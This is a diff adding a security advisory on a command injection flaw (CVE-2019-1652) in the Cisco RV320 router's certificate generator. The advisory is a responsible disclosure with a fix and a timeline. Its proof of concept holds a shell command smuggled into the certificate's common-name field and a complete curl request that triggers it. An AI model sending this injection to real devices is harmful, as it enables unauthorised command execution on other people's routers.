@@ -1,0 +1,143 @@
+RedTeam Pentesting discovered a command injection vulnerability in the
+web-based certificate generator feature of the Cisco RV320 router.
+
+
+Details
+=======
+
+Product: Cisco RV320 Dual Gigabit WAN VPN Router, possibly others
+Affected Versions: 1.4.2.15 and later
+Fixed Versions: since 1.4.2.20
+Vulnerability Type: Remote Code Execution
+Security Risk: medium
+Vendor URL: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-inject
+Vendor Status: fixed version released
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2018-004
+Advisory Status: published
+CVE: CVE-2019-1652
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1652
+
+
+Introduction
+============
+
+"Keep your employees, your business, and yourself productive and
+effective. The Cisco RV320 Dual Gigabit WAN VPN Router is an ideal
+choice for any small office or small business looking for performance,
+security, and reliability in its network."
+(from the Cisco RV320 product page [1])
+
+
+More Details
+============
+
+The router's web interface enables users to generate new X.509
+certificates directly on the device. A user may enter typical
+configuration parameters required for the certificate, such as
+organisation, the common name and so on. In order to generate the
+certificate, the device uses the command-line program openssl [2]. The
+device's firmware uses the following format string to assemble the
+openssl command:
+
+------------------------------------------------------------------------
+openssl req -new  -nodes  -subj '/C=%s/ST=%s/L=%s/O=%s/OU=%s/CN=%s/emailAddress=%s' -keyout %s%s.key -sha256 -out %s%s.csr -days %s -newkey rsa:%s  > /dev/null 2>&1
+------------------------------------------------------------------------
+
+Although the web interface filters certain special characters via
+JavaScript, there is actually no input filtering, escaping or encoding
+happening on the server. This allows attackers to inject arbitrary
+commands.
+
+
+Proof of Concept
+================
+
+Even though all components of the subject seem to be vulnerable to
+command injection, the following example uses the common name to trigger
+a ping command:
+
+------------------------------------------------------------------------
+a'$(ping -c 4 192.168.1.2)'b
+------------------------------------------------------------------------
+
+The following HTTP POST request invokes the certificate generator
+function and triggers the command injection. It requires a valid session
+cookie for the device's web interface.
+
+------------------------------------------------------------------------
+curl -s -b "$COOKIE" \
+--data "page=self_generator.htm&totalRules=1&OpenVPNRules=30"\
+"&submitStatus=1&log_ch=1&type=4&Country=A&state=A&locality=A"\
+"&organization=A&organization_unit=A&email=ab%40example.com"\
+"&KeySize=512&KeyLength=1024&valid_days=30&SelectSubject_c=1&"\
+"SelectSubject_s=1" \
+--data-urlencode "common_name=a'\$(ping -c 4 192.168.1.2)'b" \
+"http://192.168.1.1/certificate_handle2.htm?type=4"
+------------------------------------------------------------------------
+
+Afterwards, the incoming ICMP echo requests can be observed on the
+attacker's system at 192.168.1.2.
+
+
+Workaround
+==========
+
+Prevent untrusted users from using the router's web interface.
+
+
+Fix
+===
+
+Install firmware version 1.4.2.20 (or later) on the router.
+
+
+Security Risk
+=============
+
+The vulnerability allows attackers with administrative access to the
+router's web interface to execute arbitrary operating system commands on
+the device. Because attackers require valid credentials to the web
+interface, this vulnerability is only rated as a medium risk.
+
+
+Timeline
+========
+
+2018-09-19 Vulnerability identified
+2018-09-27 Customer approved disclosure to vendor
+2018-09-28 Vendor notified
+2018-10-05 Receipt of advisory acknowledged by vendor
+2018-10-05 Notified vendor of disclosure date: 2019-01-09
+2018-12-21 Postponing disclosure to 2019-01-23, as requested by vendor
+2019-01-16 List of affected versions provided by vendor
+2019-01-23 Advisory published
+
+
+References
+==========
+
+[1] https://www.cisco.com/c/en/us/products/routers/rv320-dual-gigabit-wan-vpn-router/index.html
+[2] https://wiki.openssl.org/index.php/Command_Line_Utilities
+
+
+RedTeam Pentesting GmbH
+=======================
+
+RedTeam Pentesting offers individual penetration tests performed by a
+team of specialised IT-security experts. Hereby, security weaknesses in
+company networks or products are uncovered and can be fixed immediately.
+
+As there are only few experts in this field, RedTeam Pentesting wants to
+share its knowledge and enhance the public knowledge with research in
+security-related areas. The results are made available as public
+security advisories.
+
+More information about RedTeam Pentesting can be found at:
+https://www.redteam-pentesting.de/
+
+Working at RedTeam Pentesting
+=============================
+
+RedTeam Pentesting is looking for penetration testers to join our team
+in Aachen, Germany. If you are interested please visit:
+https://www.redteam-pentesting.de/jobs/
